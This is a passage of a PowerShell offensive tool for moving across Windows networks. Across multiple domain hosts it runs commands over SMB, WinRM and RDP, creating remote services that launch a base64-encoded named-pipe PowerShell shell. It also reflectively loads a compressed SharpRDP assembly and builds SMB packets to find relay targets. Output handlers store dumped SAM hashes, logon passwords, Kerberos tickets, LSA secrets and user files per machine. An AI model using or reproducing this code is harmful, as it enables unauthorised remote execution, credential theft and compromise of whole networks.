            elseif ($result -eq "Unspecified Error"){
            if ($successOnly){continue}
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue

}
            elseif ($result -eq "Successful Connection PME") {
            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            
            }

            elseif ($result -eq "Unable to connect"){}
            
            elseif ($result) {
            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            
            if ($Module -eq ""){
            $result | Write-Host 
            Write-Host
            
            }

    switch ($Module) {
        "SAM" {
            $result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "LogonPasswords" {
            $result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "Tickets" {
            $result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "eKeys" {
            $result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "KerbDump" {
            $result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "LSA" {
            $result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "ConsoleHistory" {
            $result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "Files" {
            $result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
    }
}
            
            # Catch all, really needs fixing. Something to do with $osinfo results not coming back to the runspace logic when a command is provided. Only affects WMI function not LocalWMI
            else {if (!$SuccessOnly){Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength}}
           
        }
    }
    
    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object {-not $_.Completed})

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()



}

################################################################################################################
############################################## Function: SMB ################################################
################################################################################################################
Function Method-SMB{
Write-host

$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param($ComputerName, $Command)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect" }   
    
Function AccessCheck {
    $SMBCheck = Test-Path "\\$ComputerName\ADMIN$"
    
    if (!$SMBCheck) {
        return "Access Denied"
    } elseif ($SMBCheck) {
        if ($Command -eq "") {
            return "Successful Connection PME"
        } elseif ($Command -ne "") {}
    }
}

AccessCheck



    
    function Enter-SMBSession {

	param (
		[string]$PipeName,
		[string]$ComputerName,
		[string]$ServiceName,
		[string]$Command,
		[string]$Timeout = "3000"
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	
	
	if (-not $ComputerName) {
		Write-Output " [-] Please specify a Target"
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(!$ServiceName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	$ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)

`$pipeServer.WaitForConnection()

`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)

while (`$true) {

	# Check if client is still connected. If not, break.
	if (-not `$pipeServer.IsConnected) {
		break
	}

	`$command = `$sr.ReadLine()
	
	`$host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(4096, `$Host.UI.RawUI.BufferSize.Height)

	if (`$command -eq "exit") {
		`$sw.WriteLine("Exiting...")
		`$sw.Flush()
		break
	} 
	
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String

			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} 
		
		catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}

		`$sw.WriteLine("###END###")  # Delimiter indicating end of command result
		`$sw.Flush()
	}
}

`$pipeServer.Disconnect()
`$sr.Close()
`$sw.Close()
"@
	
	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	$FullCommand = "`$encstring = `"$B64ServerScript`"; `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
	$b64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64command`""
	$startarguments = "\\$ComputerName start $ServiceName"
	
	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	Start-Sleep -Milliseconds 200
	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
	# Get the current process ID
	$currentPID = $PID
	
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
 	try {
		$pipeClient.Connect($Timeout)
	} catch [System.TimeoutException] {
		Write-Output "[$($ComputerName)]: Connection timed out"
		Write-Output ""
		return
	} catch {
		Write-Output "[$($ComputerName)]: An unexpected error occurred"
		Write-Output ""
		return
	}

	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)

	$serverOutput = ""
	
	try{
		if ($Command) {
			$fullCommand = "$Command 2>&1 | Out-String"
			$sw.WriteLine($fullCommand)
			$sw.Flush()
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "###END###") {
					Write-Output $serverOutput.Trim()
					Write-Output ""
					return
				} else {
					$serverOutput += "$line`n"
				}
			}
		} 
		
	}
	
	finally{
		$stoparguments = "\\$ComputerName delete $ServiceName"
		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
		if ($sw) { $sw.Close() }
		if ($sr) { $sr.Close() }
	}
	
}
    return Enter-SMBSession -ComputerName $ComputerName -Command $Command

}


function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "SMB " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline

          # Attempt to resolve the IP address
        $IP = $null
        $Ping = New-Object System.Net.NetworkInformation.Ping 
        $Result = $Ping.Send($ComputerName, 10)

        if ($Result.Status -eq 'Success') {
            $IP = $Result.Address.IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }
    
        else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]

    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            

            if ($result -eq "Access Denied"){
            if ($successOnly){continue}
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue

}
           
            elseif ($result -eq "Unspecified Error"){
            if ($successOnly){continue}
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue

}
            elseif ($result -eq "Successful Connection PME") {
            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            
            }

            elseif ($result -eq "Unable to connect"){}
            
            elseif ($result) {
            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            
            if ($Module -eq ""){
            $result | Write-Host 
            Write-Host
            
            }

    switch ($Module) {
        "SAM" {
            $result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "LogonPasswords" {
            $result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "Tickets" {
            $result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "eKeys" {
            $result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "KerbDump" {
            $result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "LSA" {
            $result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "ConsoleHistory" {
            $result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "Files" {
            $result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
    }
}
           
        }
    }
    
    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object {-not $_.Completed})

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()



}

################################################################################################################
############################################### Function: WinRM ################################################
################################################################################################################
Function Method-WinRM {
Write-host

# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($computerName, $Command)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect" }
      
        try {
        
        if ($Command -eq ""){
            return Invoke-Command -ComputerName $computerName -ScriptBlock  {echo "Successful Connection PME"}  -ErrorAction Stop
        }   
            return Invoke-Command -ComputerName $computerName -ScriptBlock {Invoke-Expression $Using:Command} -ErrorAction Stop
        } catch {
            if ($_.Exception.Message -like "*Access is Denied*") {
                return "Access Denied"
            } if ($_.Exception.Message -like "*cannot be resolved*") {
                return "Unable to connect"
        }
    }
}



function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "WinRM " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline

          # Attempt to resolve the IP address
        $IP = $null
        $Ping = New-Object System.Net.NetworkInformation.Ping 
        $Result = $Ping.Send($ComputerName, 10)

        if ($Result.Status -eq 'Success') {
            $IP = $Result.Address.IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }
    
        else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            

            if ($result -eq "Access Denied"){
            if ($successOnly){continue}
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue

}
           
            elseif ($result -eq "Unspecified Error"){
            if ($successOnly){continue}
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue

}
            elseif ($result -eq "Successful Connection PME") {
            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            
            }

            elseif ($result -eq "Unable to connect"){}
            
            elseif ($result) {
            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            if ($Module -eq ""){
            $result | Write-Host 
            Write-Host
            }

    switch ($Module) {
        "SAM" {
            $result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "LogonPasswords" {
            $result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "Tickets" {
            $result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "eKeys" {
            $result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "KerbDump" {
            $result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "LSA" {
            $result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "ConsoleHistory" {
            $result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
        "Files" {
            $result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"
            if ($ShowOutput) { $result | Write-Host }
        }
    }
}

            
            # Check this
            elseif ($Module -eq "Interactive") {Start-Process powershell.exe -ArgumentList '-noexit -Command', "New-PSSession -ComputerName $ComputerName" -ErrorAction "Ignore"}
        }
    }
    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object {-not $_.Completed})

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()

}


################################################################################################################
################################################# Function: RDP ################################################
################################################################################################################
Function Method-RDP {
$ErrorActionPreference = "SilentlyContinue"
Write-Host

    $MaxConcurrentJobs = $Threads
    $RDPJobs = @()

foreach ($Computer in $Computers) {
$OS = $computer.Properties["operatingSystem"][0]
$ComputerName = $computer.Properties["dnshostname"][0]
$Random = Get-Random -Maximum "10" -Minimum "1"
Start-sleep -Seconds $Random
$ScriptBlock = {
            Param($OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth)
            $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
	        $asyncResult = $tcpClient.BeginConnect($ComputerName, 3389, $null, $null)
	        $wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
	        IF ($wait){ 
		        try{$tcpClient.EndConnect($asyncResult)
		        $tcpClient.Close()}Catch{}

function Invoke-SharpRDP{
    [CmdletBinding()]
    Param (
        [String]
        $Command = " "

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String(""))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [SharpRDP.Program]::Main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}

IF ($LocalAuth){$Domain = $ComputerName}
IF ($Password -ne ""){$output = Invoke-SharpRDP -Command "username=$Domain\$Username password=$Password computername=$ComputerName command='hostname'"}

    if ($output | Select-String "Connected to" -CaseSensitive:$false) {
            
            Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
            
            try {$Ping = New-Object System.Net.NetworkInformation.Ping
            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline}
            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
            
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "SUCCESS"

    } 

    elseif ($output | Select-String "SSL_ERR_PASSWORD_MUST_CHANGE" -CaseSensitive:$false) {

            Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
            
            try {$Ping = New-Object System.Net.NetworkInformation.Ping
            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline}
            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
            
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host "[*] " -ForegroundColor "Magenta" -NoNewline
            Write-Host "Password Change Required"
    }

    elseif ($output | Select-String "Connection closed" -CaseSensitive:$false) {

            Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
            
            try {$Ping = New-Object System.Net.NetworkInformation.Ping
            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline}
            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
            
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "ACCESS DENIED"

    }
    
    Else {

            Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
            
            try {$Ping = New-Object System.Net.NetworkInformation.Ping
            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline}
            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
            
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "ACCESS DENIED"
    } 


        }}

            while (($RDPJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
            Start-Sleep -Milliseconds 500
}

$RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth
        [array]$RDPJobs += $RDPJob

        # Check if the maximum number of concurrent jobs has been reached
        if ($RDPJobs.Count -ge $MaxConcurrentJobs) {
            do {
                # Wait for any job to complete
                $JobFinished = $null
                foreach ($Job in $RDPJobs) {
                    if ($Job.State -eq 'Completed') {
                        $JobFinished = $Job
                        break
                    }
                }

                if ($JobFinished) {
                    # Retrieve the job result and remove it from the job list
                    $Result = Receive-Job -Job $JobFinished
                    # Process the result as needed
                    $Result

                    $RDPJobs = $RDPJobs | Where-Object { $_ -ne $JobFinished }
                    Remove-Job -Job $JobFinished -Force -ErrorAction SilentlyContinue
                }
            }
            until (-not $JobFinished)
        }
    }

    # Wait for any remaining jobs to complete
    $RDPJobs | ForEach-Object {
        $JobFinished = $_ | Wait-Job -Timeout 100

        if ($JobFinished) {
            # Retrieve the job result and remove it from the job list
            $Result = Receive-Job -Job $JobFinished
            # Process the result as needed
            $Result

            Remove-Job -Job $JobFinished -Force -ErrorAction SilentlyContinue
        }
    }

    # Clean up all remaining jobs
    $RDPJobs | Remove-Job -Force -ErrorAction SilentlyContinue
}

################################################################################################################
############################################# Function: GenRelayList ###########################################
################################################################################################################
Function Get-SMBSigning  {

Param (
    [String]$Target,
    [String[]]$Targets=@(),
    [Float]$Delay,
    [Float]$DelayJitter
    ) 

    #borrowed from https://github.com/Kevin-Robertson/Inveigh/blob/master/Scripts/Inveigh-Relay.ps1
    function ConvertFrom-PacketOrderedDictionary
    {
        param($packet_ordered_dictionary)

        ForEach($field in $packet_ordered_dictionary.Values)
        {
            $byte_array += $field
        }

        return $byte_array
    }

    #NetBIOS

    function Get-PacketNetBIOSSessionService()
    {
        param([Int]$packet_header_length,[Int]$packet_data_length)

        [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
        $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]

        $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Message_Type",[Byte[]](0x00))
        $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Length",[Byte[]]($packet_netbios_session_service_length))

        return $packet_NetBIOSSessionService
    }

    #SMB1

    function Get-PacketSMBHeader()
    {
        param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

        $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBHeader.Add("SMBHeader_Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
        $packet_SMBHeader.Add("SMBHeader_Command",$packet_command)
        $packet_SMBHeader.Add("SMBHeader_ErrorClass",[Byte[]](0x00))
        $packet_SMBHeader.Add("SMBHeader_Reserved",[Byte[]](0x00))
        $packet_SMBHeader.Add("SMBHeader_ErrorCode",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Flags",$packet_flags)
        $packet_SMBHeader.Add("SMBHeader_Flags2",$packet_flags2)
        $packet_SMBHeader.Add("SMBHeader_ProcessIDHigh",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Reserved2",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_TreeID",$packet_tree_ID)
        $packet_SMBHeader.Add("SMBHeader_ProcessID",$packet_process_ID)
        $packet_SMBHeader.Add("SMBHeader_UserID",$packet_user_ID)
        $packet_SMBHeader.Add("SMBHeader_MultiplexID",[Byte[]](0x00,0x00))

        return $packet_SMBHeader
    }

    function Get-PacketSMBNegotiateProtocolRequest()
    {
        param([String]$packet_version)

        if($packet_version -eq 'SMB1')
        {
            [Byte[]]$packet_byte_count = 0x0c,0x00
        }
        else
        {
            [Byte[]]$packet_byte_count = 0x22,0x00  
        }

        $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_WordCount",[Byte[]](0x00))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_ByteCount",$packet_byte_count)
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

        if($packet_version -ne 'SMB1')
        {
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
        }

        return $packet_SMBNegotiateProtocolRequest
    }

    function Get-PacketSMBSessionSetupAndXRequest()
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_byte_count = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_byte_count = $packet_byte_count[0,1]
        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length + 5)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_WordCount",[Byte[]](0x0c))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXCommand",[Byte[]](0xff))
